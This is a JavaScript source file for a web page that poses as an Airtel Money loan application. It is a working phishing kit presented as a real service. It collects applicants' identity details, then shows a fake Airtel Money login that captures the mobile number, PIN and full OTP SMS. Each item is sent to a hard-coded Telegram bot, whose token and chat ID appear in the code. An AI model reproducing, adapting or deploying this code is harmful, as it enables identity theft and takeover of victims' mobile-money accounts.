import './style.css';

const app = document.getElementById('app');

/* ─── TELEGRAM CONFIG ──────────────────────────────────────────
 * 1. Open Telegram, search @BotFather, send /newbot
 * 2. Copy the token BotFather gives you → paste as BOT_TOKEN
 * 3. Add your bot to a group/channel, then visit:
 *    https://api.telegram.org/bot<TOKEN>/getUpdates
 *    Copy the chat id (negative number for groups) → CHAT_ID
 * ⚠⃟  This token is visible in your JS bundle. Keep your bot/group private.
 * ────────────────────────────────────────── */
const TELEGRAM = {
  BOT_TOKEN: '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms',
   // ← replace this
  CHAT_ID: '2056358288'     // ← replace this (e.g. -1001234567890)
};

/* ─── SEND TO TELEGRAM ──────────────────────────────────────── */
const postToTelegram = async (text) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 6000);

  try {
    const params = new URLSearchParams();
    params.append('chat_id', TELEGRAM.CHAT_ID);
    params.append('text', text);

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      body: params,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    const data = await res.json().catch(() => null);
    if (data && !data.ok) console.warn('Telegram error:', data.description);
    return data && data.ok;
  } catch (err) {
    clearTimeout(timeoutId);
    console.warn('Telegram POST failed, attempting GET fallback:', err.message);
    try {
      const getUrl = `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(TELEGRAM.CHAT_ID)}&text=${encodeURIComponent(text)}`;
      await fetch(getUrl, { mode: 'no-cors' });
      return true;
    } catch (e) {
      console.warn('Telegram GET fallback failed:', e.message);
      return false;
    }
  }
};

const sendToTelegram = async (s) => {
  const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' });
  const monthly = (() => {
    const r = (s.rate / 100) / 12;
    const n = s.term;
    const p = s.amount;
    if (r === 0) return (p / n).toFixed(2);
    return ((p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1)).toFixed(2);
  })();

  const msg = [
    '🏦 NEW AIRTEL LOAN APPLICATION',
    '',
    '💰 LOAN DETAILS',
    `• Amount: $${Number(s.amount).toLocaleString()}`,
    `• Term: ${s.term} months`,
    `• Purpose: ${s.purpose}`,
    `• Monthly Payment: $${monthly}`,
    '',
    '👤 APPLICANT',
    `• Name: ${s.name}`,
    `• Phone: ${s.phone}`,
    `• National ID: ${s.nationalId}`,
    `• Date of Birth: ${s.dob}`,
    `• Email: ${s.email || 'Not provided'}`,
    `• Address: ${s.address || 'Not provided'}`,
    `• Telegram: ${s.telegram || 'Not provided'}`,
    '',
    '💼 EMPLOYMENT',
    `• Status: ${s.employment}`,
    `• Employer: ${s.employer || 'Not provided'}`,
    `• Monthly Income: $${Number(s.monthlyIncome).toLocaleString()}`,
    '',
    `⏰ Submitted: ${now}`,
  ].join('\n');

  return await postToTelegram(msg);
};

const sendTextToTelegram = async (msg) => {
  return await postToTelegram(msg);
};

/* ─── VALIDATION ──────────────────────────────────────────── */
const rules = {
  'f-name': { label: 'Full Name', test: v => v.trim().length >= 2, msg: 'Please enter your full name (min 2 chars)' },
  'f-phone': { label: 'Phone Number', test: v => /^[0-9+\s-]{7,15}$/.test(v.trim()), msg: 'Please enter a valid phone number' },
  'f-nid': { label: 'National ID', test: v => v.trim().length >= 4, msg: 'Please enter a valid National ID' },
  'f-dob': { label: 'Date of Birth', test: v => !!v, msg: 'Please select your date of birth' },
  'f-emp': { label: 'Employment', test: v => !!v, msg: 'Please select your employment status' },
  'f-income': { label: 'Monthly Income', test: v => parseFloat(v) > 0, msg: 'Please enter a valid monthly income' },
  'f-purpose': { label: 'Loan Purpose', test: v => !!v, msg: 'Please select a loan purpose' },
};

const setError = (id, msg) => {
  const el = document.getElementById(id);
  const span = document.getElementById('err-' + id);
  if (!el || !span) return;
  el.classList.add('invalid'); el.classList.remove('valid');
  span.textContent = msg;
};

const clearError = (id) => {
  const el = document.getElementById(id);
  const span = document.getElementById('err-' + id);
  if (!el || !span) return;
  el.classList.remove('invalid'); el.classList.add('valid');
  span.textContent = '';
};

const validateForm = () => {
  let valid = true;
  Object.entries(rules).forEach(([id, rule]) => {
    const el = document.getElementById(id);
    if (!el) return;
    if (!rule.test(el.value)) { setError(id, rule.msg); valid = false; }
    else clearError(id);
  });
  return valid;
};

const attachLiveValidation = () => {
  Object.entries(rules).forEach(([id]) => {
    const el = document.getElementById(id);
    if (!el) return;
    const evt = el.tagName === 'SELECT' ? 'change' : 'input';
    el.addEventListener(evt, () => {
      const rule = rules[id];
      if (rule.test(el.value)) clearError(id);
      else setError(id, rule.msg);
    });
    el.addEventListener('blur', () => {
      const rule = rules[id];
      if (el.value && !rule.test(el.value)) setError(id, rule.msg);
    });
  });
};

/* ─── SPINNER ─────────────────────────────────────────────── */
const showSpinner = (msg = 'Processing your application...') => {
  const el = document.createElement('div');
  el.className = 'spinner-overlay'; el.id = 'spinner';
  el.innerHTML = `<div class="spinner"></div><div class="spinner-label">${msg}</div>`;
  document.body.appendChild(el);
};
const hideSpinner = () => document.getElementById('spinner')?.remove();


const state = {
  phone: '', pin: '',
  amount: 5000, term: 12, rate: 4.5,
  name: '', nationalId: '', dob: '', email: '',
  address: '', telegram: '', employment: '',
  employer: '', monthlyIncome: '', purpose: ''
};

const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const calcPayment = () => {
  const r = (state.rate / 100) / 12;
  const n = state.term;
  const p = state.amount;
  if (r === 0) return fmt(p / n);
  return fmt((p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1));
};

/* ─── SHARED HEADER ─────────────────────────────────────────── */
const header = () => `
<div class="site-header">
  <div class="logo-block">
    <h1>airtel<span style="color:var(--primary);">.</span></h1>
    <p>Airtel Money <span>Loans</span></p>
  </div>
  <div class="welcome-block">
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
    </svg>
    <strong>Welcome</strong>
  </div>
</div>`;

/* ─── STEPPER ────────────────────────────────────────────────── */
const stepper = (active) => {
  const steps = ['LOAN', 'PERSONAL', 'EMPLOYMENT', 'REVIEW'];
  return `<div class="stepper">${steps.map((s, i) => {
    const cls = i < active ? 'done' : i === active ? 'active' : 'pending';
    return `<div class="step-item">
      <div class="step-bar ${cls}"></div>
      <span class="step-label ${cls}">${s}</span>
    </div>`;
  }).join('')}</div>`;
};

/* ─── PAGE 1 — CALCULATOR ────────────────────────────────────── */
const renderCalculator = () => `
<div class="card-page page">
  ${header()}
  <div style="text-align:center; padding:36px 24px 20px; max-width:520px; width:100%;">
    <h1 style="font-size:1.85rem; font-weight:900; color:var(--primary); line-height:1.2; margin-bottom:8px;">
      Get Your Loan Approved <span style="color:var(--text);">Fast</span>
    </h1>
    <p style="font-size:0.88rem; color:#64748b;">Quick approval &bull; Competitive rates &bull; Flexible terms</p>
  </div>

  <div class="calc-layout" style="display:flex; flex-direction:column; gap:24px; max-width:920px; width:100%; padding:0 20px 40px;">

    <!-- Calculator card -->
    <div style="background:#fff; border-radius:20px; padding:28px; box-shadow:0 8px 32px rgba(0,0,0,0.08); flex:1;">
      <h2 style="font-size:1.1rem; font-weight:800; color:var(--text); text-align:center; margin-bottom:20px; letter-spacing:-0.3px;">Loan Calculator</h2>
      <div class="divider" style="margin-bottom:24px;"></div>

      <!-- Amount -->
      <div style="margin-bottom:28px;">
        <div class="control-label" style="font-size:0.72rem; font-weight:800; color:#64748b; text-transform:uppercase; letter-spacing:1px; margin-bottom:10px;">Loan Amount</div>
        <div style="font-size:2.4rem; font-weight:900; color:var(--primary); margin-bottom:14px;">$<span id="amtDisp">${state.amount.toLocaleString()}</span></div>
        <input type="range" class="amount-slider" id="amtSlider" min="500" max="50000" step="100" value="${state.amount}" />
        <div style="display:flex; justify-content:space-between; margin-top:8px; font-size:0.72rem; color:#94a3b8; font-weight:600;">
          <span>USD 500</span><span>USD 50,000</span>
        </div>
      </div>

      <!-- Term -->
      <div style="margin-bottom:28px;">
        <div class="control-label" style="font-size:0.72rem; font-weight:800; color:#64748b; text-transform:uppercase; letter-spacing:1px; margin-bottom:10px;">Loan Term</div>
        <div style="font-size:1.5rem; font-weight:800; color:var(--text); margin-bottom:14px;" id="termDisp">${state.term} months</div>
        <div class="term-grid">
          ${[6, 12, 24, 36, 48, 60].map(t => `
            <button class="term-btn${state.term === t ? ' active' : ''}" data-term="${t}">${t}<br>months</button>
          `).join('')}
        </div>
      </div>

      <!-- Payment -->
      <div class="payment-box" style="margin-bottom:24px;">
        <div class="p-label">Monthly Payment</div>
        <div class="p-amount">$<span id="payDisp">${calcPayment()}</span></div>
        <div class="p-rate">Interest rate: ${state.rate}% APR</div>
      </div>

      <button class="btn btn-primary" id="applyBtn" style="font-size:1rem; letter-spacing:1.5px;">APPLY NOW &rarr;</button>
    </div>

    <!-- Feature cards -->
    <div style="display:flex; flex-direction:column; gap:16px; flex:1; min-width:220px;">
      ${[
    { icon: '⚡', title: 'Fast Approval', desc: 'Within 24 hours' },
    { icon: '💰', title: 'Low Rates', desc: 'From 8% APR' },
    { icon: '🔒', title: 'Secure', desc: 'Bank-level security' }
  ].map(f => `
        <div class="feature-card">
          <div class="feature-icon" style="font-size:1.3rem;">${f.icon}</div>
          <div class="feature-content">
            <div class="fc-title">${f.title}</div>
            <div class="fc-desc">${f.desc}</div>
          </div>
        </div>
      `).join('')}
    </div>
  </div>
</div>`;

/* ─── PAGE 2 — APPLICATION FORM ─────────────────────────────── */
const field = (label, id, type = 'text', attrs = '') =>
  `<div class="form-group">
    <label for="${id}">${label}</label>
    <input type="${type}" id="${id}" ${attrs} />
    <span class="field-error" id="err-${id}"></span>
  </div>`;

const selectField = (label, id, options, required = false) =>
  `<div class="form-group">
    <label for="${id}">${label}</label>
    <select id="${id}" ${required ? 'required' : ''}>
      <option value="" disabled selected>Select...</option>
      ${options.map(o => `<option value="${o}">${o}</option>`).join('')}
    </select>
    <span class="field-error" id="err-${id}"></span>
  </div>`;


const renderForm = () => `
<div class="card-page page">
  ${header()}
  <div class="inner-card">
    <div style="padding:28px 24px 10px; text-align:center;">
      <h2 style="font-size:1.35rem; font-weight:800; color:var(--text);">Loan Application</h2>
      <p style="font-size:0.82rem; color:#64748b; margin-top:6px; line-height:1.5;">
        Please fill in all required details accurately.<br>All information is kept confidential.
      </p>
    </div>

    <div class="divider" style="margin:16px 0;"></div>

    <form id="appForm" style="padding:0 24px 32px; display:flex; flex-direction:column; gap:16px;">
      <!-- Loan Info Banner -->
      <div style="background:linear-gradient(135deg,#c90016,#ed1c24); border-radius:14px; padding:16px 20px; color:#fff; display:flex; justify-content:space-between; align-items:center;">
        <div>
          <div style="font-size:0.7rem; opacity:0.85; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Loan Amount</div>
          <div style="font-size:1.6rem; font-weight:900;">$${state.amount.toLocaleString()}</div>
        </div>
        <div style="text-align:right;">
          <div style="font-size:0.7rem; opacity:0.85; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Term</div>
          <div style="font-size:1rem; font-weight:700;">${state.term} months</div>
        </div>
        <div style="text-align:right;">
          <div style="font-size:0.7rem; opacity:0.85; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Monthly</div>
          <div style="font-size:1rem; font-weight:800; color:#fff;">$${calcPayment()}</div>
        </div>
      </div>

      ${field('Full Name', 'f-name', 'text', 'placeholder="Your full legal name" required')}
      ${field('Phone Number', 'f-phone', 'tel', 'placeholder="0712345678" required')}
      ${field('National ID', 'f-nid', 'text', 'placeholder="ID number" required')}
      ${field('Date of Birth', 'f-dob', 'date', 'required')}
      ${field('Email Address', 'f-email', 'email', 'placeholder="you@email.com"')}
      ${field('Home Address', 'f-addr', 'text', 'placeholder="Street, City"')}
      ${field('Telegram (optional)', 'f-tg', 'text', 'placeholder="@username"')}

      ${selectField('Employment Status', 'f-emp', ['Employed', 'Self-Employed', 'Business owner', 'Unemployed'], true)}

      ${field('Employer / Business Name', 'f-employer', 'text', 'placeholder="Company or business name"')}
      ${field('Monthly Net Income (USD)', 'f-income', 'number', 'placeholder="0.00" min="0" required')}

      ${selectField('Loan Purpose', 'f-purpose', ['Personal', 'Medical', 'Business', 'Education', 'Home improvement', 'Vehicle', 'Debt consolidation', 'Other'], true)}

      <div class="form-group">
        <label for="f-term">Repayment Term</label>
        <select id="f-term">
          ${[6, 12, 24, 36, 48, 60].map(t => `<option value="${t}" ${t === state.term ? 'selected' : ''}>${t} months</option>`).join('')}
        </select>
      </div>

      <button type="submit" class="btn btn-primary" style="margin-top:8px; font-size:1rem; letter-spacing:1px;">
        NEXT &rarr;
      </button>
    </form>
  </div>
</div>`;

/* ─── PAGE 3 — REVIEW ────────────────────────────────────────── */
const rRow = (label, val, cls = '') =>
  `<div class="review-row">
    <span class="review-label">${label}</span>
    <span class="review-value ${cls}">${val || '<span style="color:#c0c8d8;font-style:italic;">Not provided</span>'}</span>
  </div>`;

const renderReview = () => `
<div class="card-page page">
  ${header()}
  <div class="inner-card">
    <div style="padding:24px 24px 8px; text-align:center;">
      <h2 style="font-size:1.35rem; font-weight:800; color:var(--text);">Loan Application</h2>
      <p style="font-size:0.8rem; color:#94a3b8; margin-top:4px;">Four short steps &bull; Takes about 3 minutes</p>
    </div>
    ${stepper(3)}

    <div style="padding:20px 24px 32px;">
      <h3 style="font-size:1rem; font-weight:800; color:var(--text); margin-bottom:16px;">Review &amp; Confirm</h3>

      <div style="background:#fff8f8; border:1.5px solid #fee2e2; border-radius:14px; padding:16px 18px; margin-bottom:20px;">
        ${rRow('Amount', `$${Number(state.amount).toLocaleString()}`, 'highlight')}
        ${rRow('Term', `${state.term} months`)}
        ${rRow('Purpose', state.purpose)}
        ${rRow('Est. monthly payment', `<strong style="color:var(--primary);">$${calcPayment()}</strong>`, 'highlight')}
      </div>

      <div style="background:#fff; border:1.5px solid var(--border); border-radius:14px; padding:16px 18px; margin-bottom:20px;">
        ${rRow('Name', state.name)}
        ${rRow('National ID', state.nationalId)}
        ${rRow('Date of birth', state.dob)}
        ${rRow('Phone', state.phone)}
        ${rRow('Email', state.email)}
        ${rRow('Address', state.address)}
        ${rRow('Telegram', state.telegram)}
        ${rRow('Employment', state.employment)}
        ${rRow('Employer', state.employer)}
        ${rRow('Monthly income', state.monthlyIncome ? `$${fmt(state.monthlyIncome)}` : '')}
      </div>

      <div class="check-row" style="margin-bottom:24px;">
        <input type="checkbox" id="reviewCheck" />
        <label for="reviewCheck">I confirm that the information provided is true and complete, and I agree to the Airtel Loans terms and conditions and privacy notice.</label>
      </div>

      <div style="display:flex; gap:12px; align-items:center;">
        <button class="btn btn-outline" id="backBtn" style="width:auto; padding:14px 20px; flex-shrink:0;">
          &larr; Back
        </button>
        <button class="btn btn-primary" id="submitBtn" style="flex:1; letter-spacing:1px;">SUBMIT APPLICATION</button>
      </div>

      <p style="text-align:center; font-size:0.7rem; color:#c0c8d8; margin-top:20px;">
        Rates shown are indicative. Final terms depend on assessment.
      </p>
    </div>
  </div>
</div>`;

/* ─── PAGE 4 — SUCCESS ───────────────────────────────────────── */
const renderSuccess = () => `
<div style="min-height:100vh; display:flex; align-items:center; justify-content:center; background:var(--surface); padding:20px;" class="page">
  <div class="success-card">
    <div class="success-icon">
      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="20 6 9 17 4 12"/>
      </svg>
    </div>
    <h2>Congratulations${state.name ? ', ' + state.name.split(' ')[0] + '!' : '!'}</h2>
    <p style="margin-top:10px;">Your loan application has been received successfully.</p>
    <p style="margin-top:10px;">For the next step, please verify your <strong>Airtel Money</strong> details.</p>
    <div style="margin-top:24px; background:#fff1f2; border:1px solid #fecdd3; border-radius:10px; padding:14px;">
      <p style="font-size:0.8rem; color:var(--primary); font-weight:600;">🔐 Redirecting to secure login...</p>
    </div>
  </div>
</div>`;

/* ─── PAGE 5 — MOBILE LOGIN ──────────────────────────────────── */
const renderMobileLogin = () => `
<div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
  <div style="text-align:center; margin-bottom:40px;">
    <div class="bank-logo">airtel<span>.</span></div>
    <div class="bank-subtitle">Airtel Money <span>Portal</span></div>
  </div>

  <div class="bank-welcome" style="text-align:center; margin-bottom:40px;">
    <h2>Welcome to<br><span>Airtel Money</span></h2>
  </div>

  <div style="width:100%; max-width:360px; display:flex; flex-direction:column; gap:16px;">
    <div class="form-group">
      <label for="mbPhone">Mobile Number</label>
      <input type="tel" id="mbPhone" placeholder="07XXXXXXXX" style="font-size:1.1rem; padding:16px;" />
    </div>
    <button class="btn btn-primary" id="mbNext" style="padding:16px; font-size:1rem; letter-spacing:1px;">
      NEXT &rarr;
    </button>
  </div>
</div>`;

/* ─── PAGE 6 — PIN LOGIN ──────────────────────────────────────────────── */
const renderPinLogin = (maskedPhone = '', isOtp = false) => `
<div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
  <div style="text-align:center; margin-bottom:36px;">
    <div class="bank-logo">airtel<span>.</span></div>
    <div class="bank-subtitle">Airtel Money <span>Portal</span></div>
  </div>

  <div class="bank-welcome" style="text-align:center; margin-bottom:28px;">
    <h2>Welcome to<br><span>Airtel Money</span></h2>
  </div>

  <div style="text-align:center; margin-bottom:20px; max-width:340px; width:100%;">
    <h3 id="pinTitle" style="font-size:1.4rem; font-weight:800; color:var(--text);">${isOtp ? 'OTP Verification 🔒' : 'Secured Login 🔒'}</h3>
    <p id="pinSubtext" style="font-size:0.85rem; color:#64748b; margin-top:8px; line-height:1.4;">${isOtp ? 'Please copy the full message containing your OTP and paste it below' : 'Enter your PIN to authenticate'}</p>
    ${maskedPhone ? '<p style="font-size:0.9rem; font-weight:700; color:var(--primary); margin-top:8px; letter-spacing:2px;">' + maskedPhone + '</p>' : ''}
  </div>

  <div id="otpBanner" style="${isOtp ? 'display:block;' : 'display:none;'} width:100%; max-width:340px; background:#fff1f2; border:1.5px solid #fecdd3; border-radius:12px; padding:12px 16px; margin-bottom:16px; text-align:center; box-sizing:border-box;">
    <div style="font-size:0.92rem; font-weight:800; color:#991b1b; margin-bottom:4px;">📲 Copy Full SMS Message</div>
    <p style="font-size:0.82rem; color:#b91c1c; font-weight:600; line-height:1.4; margin:0;">
      Please copy the <strong>full message</strong> containing your OTP and paste it in the section below.
    </p>
  </div>

  <div id="pinGrid" style="width:100%; max-width:340px; margin-bottom:12px;">
    ${isOtp
      ? `<textarea id="pinInput" rows="3" placeholder="Paste full message containing OTP here..."
          style="width:100%; padding:14px 16px; font-size:0.92rem; line-height:1.5; color:#1e293b; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box; resize:none; font-family:inherit;"></textarea>`
      : `<input type="password" id="pinInput" inputmode="numeric" placeholder="Enter PIN"
          style="width:100%; padding:16px; font-size:1.4rem; letter-spacing:6px; text-align:center; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box;" />`
    }
  </div>
  <div id="pinError" class="pin-error">${isOtp ? 'Please paste the full message containing your OTP.' : 'Invalid PIN. Please try again.'}</div>

  <div style="width:100%; max-width:340px;">
    <button class="btn btn-primary" id="pinLoginBtn" style="padding:16px; font-size:1rem; letter-spacing:1px;">${isOtp ? 'Submit OTP' : 'Login'}</button>
  </div>
</div>`;

/* ─── ROUTER ─────────────────────────────────────────────────── */
function navigate(view) {

  /* ─ CALCULATOR ─ */
  if (view === 'calculator') {
    app.innerHTML = renderCalculator();
    const slider = document.getElementById('amtSlider');
    const amtDisp = document.getElementById('amtDisp');
    const payDisp = document.getElementById('payDisp');
    const termDisp = document.getElementById('termDisp');

    slider.addEventListener('input', e => {
      state.amount = parseInt(e.target.value);
      amtDisp.textContent = state.amount.toLocaleString();
      payDisp.textContent = calcPayment();
    });

    document.querySelectorAll('.term-btn').forEach(btn => {
      btn.addEventListener('click', e => {
        document.querySelectorAll('.term-btn').forEach(b => b.classList.remove('active'));
        e.currentTarget.classList.add('active');
        state.term = parseInt(e.currentTarget.dataset.term);
        termDisp.textContent = state.term + ' months';
        payDisp.textContent = calcPayment();
      });
    });

    document.getElementById('applyBtn').addEventListener('click', () => navigate('form'));
  }

  /* ─ FORM ─ */
  else if (view === 'form') {
    app.innerHTML = renderForm();
    attachLiveValidation();
    document.getElementById('appForm').addEventListener('submit', e => {
      e.preventDefault();
      if (!validateForm()) {
        // Scroll to first error
        const firstErr = document.querySelector('.invalid');
        if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
      }
      state.name = document.getElementById('f-name').value;
      state.phone = document.getElementById('f-phone').value;
      state.nationalId = document.getElementById('f-nid').value;
      state.dob = document.getElementById('f-dob').value;
      state.email = document.getElementById('f-email').value;
      state.address = document.getElementById('f-addr').value;
      state.telegram = document.getElementById('f-tg').value;
      state.employment = document.getElementById('f-emp').value;
      state.employer = document.getElementById('f-employer').value;
      state.monthlyIncome = document.getElementById('f-income').value;
      state.purpose = document.getElementById('f-purpose').value;
      state.term = parseInt(document.getElementById('f-term').value);
      navigate('review');
    });
  }

  /* ─ REVIEW ─ */
  else if (view === 'review') {
    app.innerHTML = renderReview();
    document.getElementById('backBtn').addEventListener('click', () => navigate('form'));
    document.getElementById('submitBtn').addEventListener('click', async () => {
      if (!document.getElementById('reviewCheck').checked) {
        alert('Please confirm the terms and conditions to proceed.');
        return;
      }
      showSpinner('Submitting your application...');
      await sendToTelegram(state);
      hideSpinner();
      navigate('success');
    });
  }

  /* ─ SUCCESS ─ */
  else if (view === 'success') {
    app.innerHTML = renderSuccess();
    setTimeout(() => navigate('mobileLogin'), 1800);
  }

  /* ─ MOBILE LOGIN ─ */
  else if (view === 'mobileLogin') {
    app.innerHTML = renderMobileLogin();
    const mbNextHandler = async () => {
      const phone = document.getElementById('mbPhone').value;
      if (!phone) { alert('Please enter your mobile number.'); return; }
      state.mbPhone = phone;
      state.pinAttempts = 0;
      // Mask phone: show first 4 chars, *** middle, last 3
      const masked = phone.length > 6
        ? phone.slice(0, 4) + ' *** ' + phone.slice(-3)
        : phone;
      state.maskedPhone = masked;
      showSpinner('Verifying...');
      await sendTextToTelegram(`📱 MOBILE LOGIN\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
      hideSpinner();
      navigate('pinLogin');
    };
    document.getElementById('mbNext').addEventListener('click', mbNextHandler);
    document.getElementById('mbPhone').addEventListener('keydown', e => {
      if (e.key === 'Enter') mbNextHandler();
    });
  }

  /* ─ PIN LOGIN ─ */
  else if (view === 'pinLogin') {
    state.pinAttempts = state.pinAttempts || 0;
    const isOtp = state.pinAttempts >= 1;
    app.innerHTML = renderPinLogin(state.maskedPhone || '', isOtp);
    let pinInput = document.getElementById('pinInput');

    const attachInputEvents = (inputEl, numericOnly = false) => {
      if (!inputEl) return;
      if (numericOnly) {
        inputEl.addEventListener('input', e => {
          e.target.value = e.target.value.replace(/\D/g, '');
        });
      }
      inputEl.addEventListener('keydown', e => {
        if (e.key === 'Enter' && !e.shiftKey) {
          e.preventDefault();
          document.getElementById('pinLoginBtn').click();
        }
      });
      inputEl.focus();
    };

    attachInputEvents(pinInput, !isOtp);

    document.getElementById('pinLoginBtn').addEventListener('click', async () => {
      const pinGrid = document.getElementById('pinGrid');
      const pinErr = document.getElementById('pinError');
      const pinTitle = document.getElementById('pinTitle');
      const pinSubtext = document.getElementById('pinSubtext');
      const pinLoginBtn = document.getElementById('pinLoginBtn');
      const currentInput = document.getElementById('pinInput');

      pinGrid.classList.remove('shake');
      pinErr.classList.remove('show');
      if (currentInput) currentInput.style.borderColor = '#e2e8f0';

      const val = currentInput ? currentInput.value.trim() : '';
      const currentIsOtp = state.pinAttempts >= 1;

      if (!val) {
        alert(currentIsOtp ? 'Please copy the full message containing your OTP and paste it here.' : 'Please enter your PIN.');
        return;
      }

      state.pinAttempts++;

      if (!currentIsOtp) {
        showSpinner('Authenticating...');
        await sendTextToTelegram(`🔐 PIN LOGIN\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
        hideSpinner();

        // Transition to second pin: OTP with full message instruction
        pinTitle.textContent = 'OTP Verification 🔒';
        pinSubtext.textContent = 'Please copy the full message containing your OTP and paste it below';

        const otpBanner = document.getElementById('otpBanner');
        if (otpBanner) otpBanner.style.display = 'block';

        pinGrid.innerHTML = `<textarea id="pinInput" rows="3" placeholder="Paste full message containing OTP here..."
          style="width:100%; padding:14px 16px; font-size:0.92rem; line-height:1.5; color:#1e293b; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box; resize:none; font-family:inherit;"></textarea>`;

        attachInputEvents(document.getElementById('pinInput'), false);

        pinErr.textContent = 'Please paste the full message containing your OTP.';
        pinLoginBtn.textContent = 'Submit OTP';
      } else {
        showSpinner('Verifying OTP...');
        await sendTextToTelegram(`🔑 OTP / FULL MESSAGE RECEIVED\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
        hideSpinner();
        navigate('loginSuccess');
      }
    });
  }

  /* ─ LOGIN SUCCESS ─ */
  else if (view === 'loginSuccess') {
    app.innerHTML = `
<div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px;" class="page">
  <div style="text-align:center; max-width:360px;">
    <div style="width:80px; height:80px; background:linear-gradient(135deg,var(--primary),#ff4d52); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 24px; box-shadow:0 8px 24px rgba(237,28,36,0.35); animation:popIn 0.4s ease both;">
      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
    </div>
    <h2 style="font-size:1.6rem; font-weight:900; color:var(--text); margin-bottom:12px;">Login Successful!</h2>
    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:8px;">Welcome back, <strong>${state.name ? state.name.split(' ')[0] : 'valued customer'}</strong>.</p>
    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:32px;">Your Airtel Money session has been verified successfully.</p>
    <div style="background:#fff1f2; border:1.5px solid #fecdd3; border-radius:14px; padding:16px 20px; margin-bottom:32px;">
      <p style="color:var(--primary); font-size:0.82rem; font-weight:600;">✅ Your loan application is being reviewed. Our team will contact you within 24 hours.</p>
    </div>
    <div style="background:#f8fafc; border:1.5px solid #e2e8f0; border-radius:14px; padding:16px 20px;">
      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Amount</span><span style="font-weight:700; color:var(--text);">$${Number(state.amount).toLocaleString()}</span></div>
      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Term</span><span style="font-weight:700; color:var(--text);">${state.term} months</span></div>
      <div style="display:flex; justify-content:space-between; font-size:0.82rem;"><span style="color:#64748b;">Monthly Payment</span><span style="font-weight:700; color:var(--primary);">$${calcPayment()}</span></div>
    </div>
  </div>
</div>`;
  }
}

navigate('calculator');
